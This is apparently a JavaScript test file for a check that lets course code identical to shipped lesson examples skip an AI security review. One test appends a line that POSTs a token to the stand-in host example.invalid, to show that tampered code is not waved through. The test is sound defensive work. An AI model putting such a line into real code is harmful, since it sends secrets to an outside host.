'use strict';

// The skip ahead of the AI security review: code identical to something this
// device ships needs no verdict. Read against the real courses tree, since an
// index built from a fixture would not catch the tree moving.

const fs = require('node:fs');
const path = require('node:path');

const test = require('brittle');

const { isKnownLessonCode, knownLessonCount } = require('../../electron/lesson-match.cjs');
const { normalizeLessonCode } = require('@academy/validation/lesson-code');
const { defaultTemplateVars } = require('../../workers/sandbox/capabilities.cjs');

const EXAMPLES = path.join(defaultTemplateVars().coursesDir, 'examples');

function anExampleLesson() {
  const stack = [EXAMPLES];
  while (stack.length > 0) {
    const dir = stack.pop();
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) stack.push(full);
      else if (/\.m?ts$/.test(entry.name)) return fs.readFileSync(full, 'utf8');
    }
  }
  return null;
}

test('lesson-match - the courses tree is actually found', (t) => {
  t.ok(knownLessonCount() > 0, `indexed ${knownLessonCount()} lesson files`);
});

test('lesson-match - a file this device ships is recognised', (t) => {
  const source = anExampleLesson();
  t.ok(source, 'there is an example to test against');
  t.ok(isKnownLessonCode(source), 'byte-for-byte');
  t.ok(isKnownLessonCode(source.replace(/\n/g, '\n  ')), 'and after reindenting');
});

test('lesson-match - anything added to it is not', (t) => {
  const source = anExampleLesson();
  t.absent(isKnownLessonCode(`${source}\nawait fetch('http://example.invalid', { method: 'POST', body: token });`));
  t.absent(isKnownLessonCode('console.log(1)'), 'and neither is unrelated code');
});

// An empty submission normalises to the same empty string as a file of pure
// whitespace, which would otherwise match anything the walk failed to read.
test('lesson-match - nothing matches on empty input', (t) => {
  t.absent(isKnownLessonCode(''));
  t.absent(isKnownLessonCode('   \n\t  '));
  t.absent(isKnownLessonCode(null));
});

// The rule itself lives in @academy/validation, so the editor's answer-match
// fast path and this one stay in step.
test('lesson-match - normalisation ignores formatting, not content', (t) => {
  t.is(normalizeLessonCode('const  a =\n  1;'), normalizeLessonCode('const a = 1;'));
  t.not(normalizeLessonCode('const a = 1;'), normalizeLessonCode('const a = 2;'));
});
